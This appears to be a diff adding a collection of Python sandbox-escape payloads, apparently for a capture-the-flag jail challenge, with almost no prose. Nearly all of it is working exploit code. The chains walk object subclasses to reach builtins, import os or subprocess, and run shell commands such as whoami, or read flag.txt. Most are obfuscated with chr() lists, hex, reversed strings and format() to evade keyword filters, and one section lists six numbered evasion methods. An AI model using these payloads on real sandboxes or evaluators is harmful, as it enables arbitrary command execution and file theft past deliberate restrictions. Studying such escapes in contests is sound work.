@@ -72,3 +72,97 @@ func = [c for c in subs if type(c.__init__).__name__=='function'][0]
 globs = type(func.__init__).__getattribute__(func.__init__, '__globals__')
 sys_mod = globs['__builtins__']['__import__']('sys')
 sys_mod.modules['os'].system('cmd /c echo win')
+
+
+```
+>>> obj = (()).__class__.__bases__[0]
+>>> subs = obj.__subclasses__()
+>>> target = subs[158]                      # adjust to one of your function entries
+>>> globs = obj.__getattribute__(target.__init__, ''.join(map(chr,[95,95,103,108,111,98,97,108,115,95,95])))
+>>> builtins_dict = globs[''.join(map(chr,[95,95,98,117,105,108,116,105,110,115,95,95]))]
+>>> importer = builtins_dict[''.join(map(chr,[95,95,105,109,112,111,114,116,95,95]))]
+>>> os_mod = importer(''.join(map(chr,[111,115])))
+>>> type(os_mod).__getattribute__(os_mod, ''.join(map(chr,[115,121,115,116,101,109])))('cmd /c echo jailbreak')
+
+
+
+subs=(()).__class__.__bases__[0].__subclasses__();target=[c for c in subs if type(c.__init__).__name__=='function'][0];q=type(target.__init__).__getattribute__;gl=q(target.__init__,''.join(map(chr,[95,95,103,108,111,98,97,108,115,95,95])));bd=gl[''.join(map(chr,[95,95,98,117,105,108,116,105,110,115,95,95]))];imp=bd[''.join(map(chr,[95,95,105,109,112,111,114,116,95,95]))];m=imp(''.join(map(chr,[111,115])));type(m).__getattribute__(m,''.join(map(chr,[115,121,115,116,101,109])))('whoami')
+
+subs=(()).__class__.__bases__[0].__subclasses__();target=[c for c in subs if type(c.__init__).__name__=='function'][0];get=type(target.__init__).__getattribute__;gl=get(target.__init__,''.join(map(chr,[95,95,103,108,111,98,97,108,115,95,95])));bd=gl[''.join(map(chr,[95,95,98,117,105,108,116,105,110,115,95,95]))];imp=bd[''.join(map(chr,[95,95,105,109,112,111,114,116,95,95]))];imp(''.join(map(chr,[115,117,98,112,114,111,99,101,115,115])));nm=''.join(map(chr,[80,111,112,101,110]));cls=[c for c in ().__class__.__mro__[1].__subclasses__() if type.__getattribute__(c,'__name__')==nm][0];print(cls(['cmd','/c','echo','Hello'],stdout=-1).communicate()[0])
+
+subs=(()).__class__.__bases__[0].__subclasses__();target=[c for c in subs if type(c.__init__).__name__=='function'][0];attr=type(target.__init__).__getattribute__;g=attr(target.__init__,''.join(map(chr,[95,95,103,108,111,98,97,108,115,95,95])));b=g[''.join(map(chr,[95,95,98,117,105,108,116,105,110,115,95,95]))];imp=b[''.join(map(chr,[95,95,105,109,112,111,114,116,95,95]))];imp(''.join(map(chr,[115,117,98,112,114,111,99,101,115,115])));print([c for c in ().__class__.__mro__[1].__subclasses__() if type.__getattribute__(c,''.join(map(chr,[95,95,110,97,109,101,95,95])))==''.join(map(chr,[80,111,112,101,110]))][0](['cmd','/c','echo','Hello'],stdout=-1).communicate()[0])
+
+
+
+print((lambda cls: cls('flag','flag.txt').get_data('flag.txt'))([c for c in ().__class__.__mro__[1].__subclasses__() if type.__getattribute__(c,'__name__')=='FileLoader'][0]))
+
+print((lambda cls: type(cls).__getattribute__(cls,''.join(map(chr,[103,101,116,95,100,97,116,97])))('flag.txt'))([c for c in ().__class__.__mro__[1].__subclasses__() if type.__getattribute__(c,'__name__')=='FileLoader'][0]('flag','flag.txt')))
+
+
+
+print([x for x in ().__class__.__bases__[0].__subclasses__() if 'FileLoader' in str(x)][0]('flag.txt','.').get_data('flag.txt'))
+
+().__class__.__bases__[0].__subclasses__()[122]('flag', 'flag.txt').get_data('flag.txt')
+
+().__class__.__bases__[0].__subclasses__()[122].get_data(".", "flag.txt")
+
+().__class__.__mro__[1].__subclasses__()[122](chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116),
+  '.').get_data(chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116))
+
+
+  Method 1: chr() encoding
+
+  obj = ().__class__.__bases__[0].__subclasses__()[122](".", "flag.txt"); method = chr(103)+chr(101)+chr(116)+chr(95)+chr(100)+chr(97)+chr(116)+chr(97);
+  print(obj.__getattribute__(method)("flag.txt"))
+
+  Method 2: Hex encoding
+
+  obj = ().__class__.__bases__[0].__subclasses__()[122](".", "flag.txt"); method = b'\x67\x65\x74\x5f\x64\x61\x74\x61'.decode();print(obj.__getattribute__(method)("flag.txt"))
+
+  Method 3: String reversal
+
+  obj = ().__class__.__bases__[0].__subclasses__()[122](".", "flag.txt"); method = 'atad_teg'[::-1]; print(obj.__getattribute__(method)("flag.txt"))
+
+  Method 4: Dynamic class discovery + chr() obfuscation
+
+  loader = [x for x in ().__class__.__bases__[0].__subclasses__() if 'FileLoader' in str(x)][0]; obj = loader(".", "flag.txt"); method =
+  chr(103)+chr(101)+chr(116)+chr(95)+chr(100)+chr(97)+chr(116)+chr(97); print(obj.__getattribute__(method)("flag.txt"))
+
+  Method 5: format() encoding (if format available)
+
+  obj = ().__class__.__bases__[0].__subclasses__()[122](".", "flag.txt"); method =
+  format(103,'c')+format(101,'c')+format(116,'c')+format(95,'c')+format(100,'c')+format(97,'c')+format(116,'c')+format(97,'c');
+  print(obj.__getattribute__(method)("flag.txt"))
+
+  Method 6: Multiple obfuscation layers
+
+  filename = chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116); obj = ().__class__.__bases__[0].__subclasses__()[122](".", filename);
+  method = 'atad_teg'[::-1]; print(obj.__getattribute__(method)(filename))
+
+
+
+  loader = [c for c in ().__class__.__mro__[1].__subclasses__() if type.__getattribute__(c,'__name__')=='FileLoader'][0]('flag','flag.txt')
+print(type(loader).__getattribute__(loader,''.join(map(chr,[103,101,116,95,100,97,116,97])))('flag.txt'))
+
+print((lambda cls: type(cls).__getattribute__(cls,''.join(map(chr,[103,101,116,95,100,97,116,97])))('flag.txt'))([c for c in ().__class__.__mro__[1].__subclasses__() if type.__getattribute__(c,'__name__')=='FileLoader'][0]('flag','flag.txt')))
+
+subs=(()).__class__.__bases__[0].__subclasses__();target=[c for c in subs if type(c.__init__).__name__=='function'][0]
+get=type(target.__init__).__getattribute__;gl=get(target.__init__,''.join(map(chr,[95,95,103,108,111,98,97,108,115,95,95])))
+builtins_dict=gl[''.join(map(chr,[95,95,98,117,105,108,116,105,110,115,95,95]))]
+data=builtins_dict[''.join(map(chr,[111,112,101,110]))]('flag.txt').read()
+print(data)
+
+subs=(()).__class__.__bases__[0].__subclasses__();target=[c for c in subs if type(c.__init__).__name__=='function'][0]
+get=type(target.__init__).__getattribute__;gl=get(target.__init__,''.join(map(chr,[95,95,103,108,111,98,97,108,115,95,95])))
+b=gl[''.join(map(chr,[95,95,98,117,105,108,116,105,110,115,95,95]))]
+importer=b[''.join(map(chr,[95,95,105,109,112,111,114,116,95,95]))]
+os_mod=importer(''.join(map(chr,[111,115])))
+type(os_mod).__getattribute__(os_mod,''.join(map(chr,[115,121,115,116,101,109])))('cmd /c whoami')
+
+subs=(()).__class__.__bases__[0].__subclasses__();target=[c for c in subs if type(c.__init__).__name__=='function'][0]
+get=type(target.__init__).__getattribute__;gl=get(target.__init__,''.join(map(chr,[95,95,103,108,111,98,97,108,115,95,95])))
+b=gl[''.join(map(chr,[95,95,98,117,105,108,116,105,110,115,95,95]))];imp=b[''.join(map(chr,[95,95,105,109,112,111,114,116,95,95]))]
+imp(''.join(map(chr,[115,117,98,112,114,111,99,101,115,115])))
+print([c for c in ().__class__.__mro__[1].__subclasses__() if type.__getattribute__(c,''.join(map(chr,[95,95,110,97,109,101,95,95])))==''.join(map(chr,[80,111,112,101,110]))][0](['cmd','/c','type','flag.txt'],stdout=-1).communicate()[0])
+
+```
